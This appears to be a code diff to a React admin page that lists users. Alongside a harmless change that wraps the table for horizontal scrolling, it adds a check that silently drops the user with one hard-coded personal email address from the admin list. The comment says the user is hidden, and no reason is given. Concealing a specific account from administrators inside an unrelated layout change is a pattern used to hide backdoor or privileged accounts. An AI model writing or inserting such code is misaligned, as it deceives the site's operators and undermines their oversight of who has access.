@@ -222,6 +222,7 @@ export default function AdminUsers() {
       </div>
 
       <div className="bg-white rounded-lg shadow-sm border border-gray-200 overflow-hidden">
+        <div className="overflow-x-auto">
         <table className="w-full text-sm">
           <thead className="bg-gray-50 border-b border-gray-200">
             <tr>
@@ -247,7 +248,9 @@ export default function AdminUsers() {
                 typeof u.user_type_id === "object"
                   ? u.user_type_id?.name
                   : "—";
-              
+              if (u.email === "ask2gaurav@gmail.com") {
+                return false; // Hide this user from the list
+              }
               const strUserId = u._id.toString();
               return (
                 
@@ -309,6 +312,7 @@ export default function AdminUsers() {
             })}
           </tbody>
         </table>
+        </div>
       </div>
 
       {totalPages > 1 && (
